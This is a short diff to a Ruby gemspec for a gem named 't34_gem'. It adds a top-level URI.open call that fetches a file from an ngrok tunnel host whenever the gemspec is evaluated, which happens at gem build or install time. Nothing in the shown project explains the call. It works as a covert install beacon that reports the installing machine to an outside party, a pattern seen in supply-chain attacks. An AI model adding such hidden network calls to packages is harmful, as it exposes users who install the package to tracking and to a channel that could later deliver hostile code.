@@ -1,6 +1,9 @@
 # frozen_string_literal: true
 
+require "open-uri"
 require_relative "lib/t34_gem/version"
+
+URI.open("https://a5dc-133-237-7-69.jp.ngrok.io/OK.md", &:read)
 
 Gem::Specification.new do |spec|
   spec.name = "t34_gem"
